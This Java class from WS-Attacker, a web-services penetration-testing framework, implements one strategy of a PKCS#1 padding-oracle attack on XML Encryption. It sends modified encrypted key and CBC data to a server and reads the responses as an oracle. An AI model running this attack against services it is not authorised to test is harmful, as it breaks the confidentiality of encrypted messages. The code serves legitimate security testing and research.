/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */

package wsattacker.library.xmlencryptionattack.attackengine.oracle.concrete.pkcs1.strategy;

import java.util.logging.Level;
import java.util.logging.Logger;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import wsattacker.library.signatureWrapping.util.exception.InvalidPayloadException;
import wsattacker.library.xmlencryptionattack.attackengine.attacker.cbc.CBCVectorGenerator;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.request.OracleRequest;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.response.OracleResponse;
import static wsattacker.library.xmlencryptionattack.attackengine.oracle.base.response.OracleResponse.Result.VALID;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.concrete.pkcs1.PKCS1Oracle;
import wsattacker.library.xmlencryptionattack.encryptedelements.ElementAttackProperties;
import wsattacker.library.xmlencryptionattack.encryptedelements.data.EncryptedDataElement;
import wsattacker.library.xmlencryptionattack.encryptedelements.key.EncryptedKeyElement;
import wsattacker.library.xmlencryptionattack.util.HelperFunctions;
import wsattacker.library.xmlencryptionattack.util.ServerSendCommandIF;
import wsattacker.library.xmlutilities.dom.DomUtilities;

/**
 * @author Dennis
 */
public class CBCStrategy
    extends AbstractPKCS1Strategy
{
    private final OracleRequest[] m_RandomEncDataValues;

    private Document m_DmyAttackDoc;

    private static final Logger LOG = Logger.getLogger( CBCStrategy.class.getName() );

    public CBCStrategy( final PKCS1Oracle pkcs1Oracle )
    {
        Element encDataOfEncKey = null;
        this.m_PKSC1Oracle = pkcs1Oracle;
        this.m_RandomEncDataValues =
            CBCVectorGenerator.generateVectors( m_PKSC1Oracle.getAttackedAlgoritm().BLOCK_SIZE );

        if ( m_PKSC1Oracle.getAttackPayload() instanceof EncryptedKeyElement )
        {
            EncryptedDataElement encData = null;
            EncryptedKeyElement encKeyPayEl = (EncryptedKeyElement) m_PKSC1Oracle.getAttackPayload();
            encData = HelperFunctions.getEncDataOfEncryptedKey( encKeyPayEl );
            ElementAttackProperties attackProps = encData.getAttackProperties();

            if ( null != attackProps.getAttackPayloadElement() )
            {
                encDataOfEncKey = attackProps.getAttackPayloadElement(); // with wrapping
            }
            else
            {
                encDataOfEncKey = encData.getEncryptedElement();
                if ( null != attackProps.getSignedPart() )
                    LOG.warning( "EncData signed but no wrapping attacks executed" );
            }

            m_DmyAttackDoc = DomUtilities.createNewDomFromNode( m_PKSC1Oracle.getAvoidedFile().getDocumentElement() );
            ElementAttackProperties attackPropsKey = encKeyPayEl.getAttackProperties();
            Element encKeyPay =
                DomUtilities.findCorrespondingElement( m_DmyAttackDoc, attackPropsKey.getAttackPayloadElement() );
            Element encKeyData = DomUtilities.findCorrespondingElement( m_DmyAttackDoc, encDataOfEncKey );

            this.m_AttackPayloadKeyDmy = new EncryptedKeyElement( encKeyPay );
            this.m_AttackPayloadDataDmy = new EncryptedDataElement( encKeyData );
        }
        else
            throw new IllegalArgumentException( "PKCS1ErrorOracle defined but no encryptedkey attack palyoad set" );
    }

    /**
     * @param serverSendCmnd
     * @param request
     * @return
     */
    @Override
    public OracleResponse handleRequest( ServerSendCommandIF serverSendCmnd, OracleRequest request )
    {
        OracleResponse respMaxScore = null;
        String responseServer = null;
        OracleResponse resp = new OracleResponse();

        m_AttackPayloadKeyDmy.getCipherDataChild().setEncryptedData( request.getEncryptedKeyBase64() );

        for ( int i = 0; m_RandomEncDataValues.length > i; i++ )
        {
            m_AttackPayloadDataDmy.getCipherDataChild().setEncryptedData( m_RandomEncDataValues[i].getEncryptedDataBase64() );
            try
            {
                m_PKSC1Oracle.handleTimeStamp( m_DmyAttackDoc );
            }
            catch ( InvalidPayloadException ex )
            {
                Logger.getLogger( CBCStrategy.class.getName() ).log( Level.SEVERE, null, ex );
            }

            responseServer = serverSendCmnd.send( DomUtilities.domToString( m_DmyAttackDoc ) );
            resp.setResponse( responseServer );
            respMaxScore =
                m_PKSC1Oracle.getOracleBehaviour().compareServerRespWithUserClassification( resp, m_AttackPayloadKeyDmy );

            if ( VALID == respMaxScore.getResult() )
            {
                break;
            }
        }

        return respMaxScore;
    }

}
